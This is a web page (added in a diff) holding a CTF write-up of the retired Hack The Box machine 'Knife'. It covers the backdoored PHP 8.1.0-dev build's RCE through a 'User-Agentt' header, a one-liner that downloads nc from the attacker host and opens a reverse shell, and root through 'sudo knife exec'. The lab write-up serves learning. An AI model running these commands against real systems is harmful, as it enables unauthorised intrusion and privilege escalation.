@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Knife &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Knife</h1>
+    <div class="meta">Target: <code>10.10.14.126</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">php</span><span class="tag">CVE</span><span class="tag">backdoor</span><span class="tag">sudo</span><span class="tag">GTFOBins</span><span class="tag">chef</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#php-8-1-0-dev-backdoor">PHP 8.1.0-dev Backdoor</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#sudo-knife-gtfobins">sudo knife, GTFOBins</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Knife is an easy Linux box that's almost entirely about recognizing two known issues. The web server runs a backdoored development build of PHP (<strong>PHP 8.1.0-dev</strong>), giving instant unauthenticated RCE via a magic header. Root is a one-liner: <code>sudo</code> access to the <code>knife</code> Chef tool, which has a GTFOBins entry.</p>
+<h2 id="recon">Recon</h2>
+<p>The site is plain PHP on Apache, but Nikto caught the giveaway in a response header:</p>
+<pre><code>x-powered-by: PHP/8.1.0-dev
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="php-8-1-0-dev-backdoor">PHP 8.1.0-dev Backdoor</h3>
+<blockquote>
+<p><strong>The backdoor:</strong> in 2021, PHP's git server was compromised and a malicious commit slipped into a dev build. It checks for a <code>User-Agentt</code> header (note the double "t") and executes its contents via <code>zend_eval_string</code>. So any request carrying that header runs PHP, and thus OS commands, with no authentication.</p>
+</blockquote>
+<p>The <a href="https://www.exploit-db.com/exploits/49933">PoC</a> automates it into an interactive shell:</p>
+<pre><code class="language-sh">python3 php.py
+Enter the host url: http://10.129.24.169/
+$ whoami
+james
+</code></pre>
+<p>The restricted shell wouldn't <code>cd</code>, so I worked from <code>/tmp</code>, pulled my own <code>nc</code> binary, made it executable, and caught a full TTY-capable shell:</p>
+<pre><code class="language-sh">cd /tmp; wget http://10.10.14.126/nc; chmod +x nc; ./nc 10.10.14.126 443 -e /bin/bash
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-knife-gtfobins">sudo knife, GTFOBins</h3>
+<pre><code class="language-sh">sudo -l
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+</code></pre>
+<blockquote>
+<p><strong>What <code>knife</code> is:</strong> the CLI for Chef, an infrastructure-automation platform. <code>knife exec</code> runs arbitrary Ruby, and when <code>knife</code> itself runs as root via sudo, that Ruby runs as root. GTFOBins documents the exact escape.</p>
+</blockquote>
+<pre><code class="language-sh">sudo knife exec -E 'exec &quot;/bin/sh&quot;'
+# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Check response headers.</strong> <code>PHP/8.1.0-dev</code> is a backdoored build with trivial unauth RCE via the <code>User-Agentt</code> header.</li>
+<li><strong>Restricted shells: pull a static <code>nc</code> and pivot to <code>/tmp</code></strong> when <code>cd</code> and built-ins misbehave.</li>
+<li><strong>GTFOBins for any sudo binary.</strong> <code>knife exec</code> runs Ruby as root, a single command to a shell.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
